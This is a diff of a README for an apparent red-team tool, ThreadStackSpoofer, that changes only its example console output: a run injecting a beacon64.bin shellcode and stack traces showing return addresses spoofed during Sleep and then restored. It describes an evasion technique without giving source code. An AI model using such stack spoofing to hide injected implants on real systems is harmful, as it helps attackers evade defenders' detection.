@@ -99,48 +99,50 @@ Example run that spoofs beacon's thread call stack:
 ```
 C:\> ThreadStackSpoofer.exe beacon64.bin 1
 [.] Reading shellcode bytes...
-[.] Initializing stack spoofer...
+[.] Thread call stack will be spoofed.
 [+] Stack spoofing initialized.
 [.] Hooking kernel32!Sleep...
 [.] Injecting shellcode...
+
 WalkCallStack: Stack Trace:
-        2.      calledFrom: 0x7ff7abc92de4 - stack: 0x50174ff7d0 - frame: 0x50174ff8e0 - ret: 0x1f255dabd51 - skip? 0
-        3.      calledFrom: 0x1f255dabd51 - stack: 0x50174ff8f0 - frame: 0x50174ff8e8 - ret: 0x1388 - skip? 0
-        4.      calledFrom: 0x    1388 - stack: 0x50174ff8f8 - frame: 0x50174ff8f0 - ret: 0x1f25683ae80 - skip? 0
-        5.      calledFrom: 0x1f25683ae80 - stack: 0x50174ff900 - frame: 0x50174ff8f8 - ret: 0x1b000100000004 - skip? 0
-        6.      calledFrom: 0x1b000100000004 - stack: 0x50174ff908 - frame: 0x50174ff900 - ret: 0x8003600140000 - skip? 0
-        7.      calledFrom: 0x8003600140000 - stack: 0x50174ff910 - frame: 0x50174ff908 - ret: 0x1f255f76040 - skip? 0
-        8.      calledFrom: 0x1f255f76040 - stack: 0x50174ff918 - frame: 0x50174ff910 - ret: 0x1f255d8cd9f - skip? 0
-        9.      calledFrom: 0x1f255d8cd9f - stack: 0x50174ff920 - frame: 0x50174ff918 - ret: 0x1f255d8cdd0 - skip? 0
-WalkCallStack: Stack Trace finished.
-                        Spoofed: 0x1f255dabd51 -> 0x7ffeb7f74b60
+        2.      calledFrom: 0x7ff7c8ba7f54 - stack: 0xdc5eaffbd0 - frame: 0xdc5eaffce0 - ret: 0x2550d3ebd51 - skip? 0
+        3.      calledFrom: 0x2550d3ebd51 - stack: 0xdc5eaffcf0 - frame: 0xdc5eaffce8 - ret: 0x1388 - skip? 0
+        4.      calledFrom: 0x    1388 - stack: 0xdc5eaffcf8 - frame: 0xdc5eaffcf0 - ret: 0x2550d1ff760 - skip? 0
+        5.      calledFrom: 0x2550d1ff760 - stack: 0xdc5eaffd00 - frame: 0xdc5eaffcf8 - ret: 0x1b000100000004 - skip? 0
+        6.      calledFrom: 0x1b000100000004 - stack: 0xdc5eaffd08 - frame: 0xdc5eaffd00 - ret: 0xd00017003a0001 - skip? 0
+        7.      calledFrom: 0xd00017003a0001 - stack: 0xdc5eaffd10 - frame: 0xdc5eaffd08 - ret: 0x2550d5b7040 - skip? 0
+        8.      calledFrom: 0x2550d5b7040 - stack: 0xdc5eaffd18 - frame: 0xdc5eaffd10 - ret: 0x2550d3ccd9f - skip? 0
+        9.      calledFrom: 0x2550d3ccd9f - stack: 0xdc5eaffd20 - frame: 0xdc5eaffd18 - ret: 0x2550d3ccdd0 - skip? 0
+                        Spoofed: 0x2550d3ebd51 -> 0x7ffeb7f74b60
                         Spoofed: 0x00001388 -> 0x7ffeb7f74b60
-                        Spoofed: 0x1f25683ae80 -> 0x7ffeb7f74b60
+                        Spoofed: 0x2550d1ff760 -> 0x7ffeb7f74b60
                         Spoofed: 0x1b000100000004 -> 0x7ffeb7f74b60
-                        Spoofed: 0x8003600140000 -> 0x7ffeb7f74b60
-                        Spoofed: 0x1f255f76040 -> 0x7ffeb7f74b60
-                        Spoofed: 0x1f255d8cd9f -> 0x7ffeb7f74b60
-                        Spoofed: 0x1f255d8cdd0 -> 0x7ffeb7f74b60
-MySleep(5000)
+                        Spoofed: 0xd00017003a0001 -> 0x7ffeb7f74b60
+                        Spoofed: 0x2550d5b7040 -> 0x7ffeb7f74b60
+                        Spoofed: 0x2550d3ccd9f -> 0x7ffeb7f74b60
+                        Spoofed: 0x2550d3ccdd0 -> 0x7ffeb7f74b60
+
+===> MySleep(5000)
+
 [+] Shellcode is now running.
+
 WalkCallStack: Stack Trace:
-        2.      calledFrom: 0x7ff7abc92e14 - stack: 0x50174ff7d0 - frame: 0x50174ff8e0 - ret: 0x7ffeb7f74b60 - skip? 1
-        3.      calledFrom: 0x7ffeb7f74b60 - stack: 0x50174ff8f0 - frame: 0x50174ff8e8 - ret: 0x7ffeb7f74b60 - skip? 1
-        4.      calledFrom: 0x7ffeb7f74b60 - stack: 0x50174ff8f8 - frame: 0x50174ff8f0 - ret: 0x7ffeb7f74b60 - skip? 1
-        5.      calledFrom: 0x7ffeb7f74b60 - stack: 0x50174ff900 - frame: 0x50174ff8f8 - ret: 0x7ffeb7f74b60 - skip? 1
-        6.      calledFrom: 0x7ffeb7f74b60 - stack: 0x50174ff908 - frame: 0x50174ff900 - ret: 0x7ffeb7f74b60 - skip? 1
-        7.      calledFrom: 0x7ffeb7f74b60 - stack: 0x50174ff910 - frame: 0x50174ff908 - ret: 0x7ffeb7f74b60 - skip? 1
-        8.      calledFrom: 0x7ffeb7f74b60 - stack: 0x50174ff918 - frame: 0x50174ff910 - ret: 0x7ffeb7f74b60 - skip? 1
-        9.      calledFrom: 0x7ffeb7f74b60 - stack: 0x50174ff920 - frame: 0x50174ff918 - ret: 0x7ffeb7f74b60 - skip? 1
-WalkCallStack: Stack Trace finished.
-                        Restored: 0x7ffeb7f74b60 -> 0x1f255dabd51
+        2.      calledFrom: 0x7ff7c8ba7f84 - stack: 0xdc5eaffbd0 - frame: 0xdc5eaffce0 - ret: 0x7ffeb7f74b60 - skip? 1
+        3.      calledFrom: 0x7ffeb7f74b60 - stack: 0xdc5eaffcf0 - frame: 0xdc5eaffce8 - ret: 0x7ffeb7f74b60 - skip? 1
+        4.      calledFrom: 0x7ffeb7f74b60 - stack: 0xdc5eaffcf8 - frame: 0xdc5eaffcf0 - ret: 0x7ffeb7f74b60 - skip? 1
+        5.      calledFrom: 0x7ffeb7f74b60 - stack: 0xdc5eaffd00 - frame: 0xdc5eaffcf8 - ret: 0x7ffeb7f74b60 - skip? 1
+        6.      calledFrom: 0x7ffeb7f74b60 - stack: 0xdc5eaffd08 - frame: 0xdc5eaffd00 - ret: 0x7ffeb7f74b60 - skip? 1
+        7.      calledFrom: 0x7ffeb7f74b60 - stack: 0xdc5eaffd10 - frame: 0xdc5eaffd08 - ret: 0x7ffeb7f74b60 - skip? 1
+        8.      calledFrom: 0x7ffeb7f74b60 - stack: 0xdc5eaffd18 - frame: 0xdc5eaffd10 - ret: 0x7ffeb7f74b60 - skip? 1
+        9.      calledFrom: 0x7ffeb7f74b60 - stack: 0xdc5eaffd20 - frame: 0xdc5eaffd18 - ret: 0x7ffeb7f74b60 - skip? 1
+                        Restored: 0x7ffeb7f74b60 -> 0x2550d3ebd51
                         Restored: 0x7ffeb7f74b60 -> 0x1388
-                        Restored: 0x7ffeb7f74b60 -> 0x1f25683ae80
+                        Restored: 0x7ffeb7f74b60 -> 0x2550d1ff760
                         Restored: 0x7ffeb7f74b60 -> 0x1b000100000004
-                        Restored: 0x7ffeb7f74b60 -> 0x8003600140000
-                        Restored: 0x7ffeb7f74b60 -> 0x1f255f76040
-                        Restored: 0x7ffeb7f74b60 -> 0x1f255d8cd9f
-                        Restored: 0x7ffeb7f74b60 -> 0x1f255d8cdd0
+                        Restored: 0x7ffeb7f74b60 -> 0xd00017003a0001
+                        Restored: 0x7ffeb7f74b60 -> 0x2550d5b7040
+                        Restored: 0x7ffeb7f74b60 -> 0x2550d3ccd9f
+                        Restored: 0x7ffeb7f74b60 -> 0x2550d3ccdd0
 ```
 
 
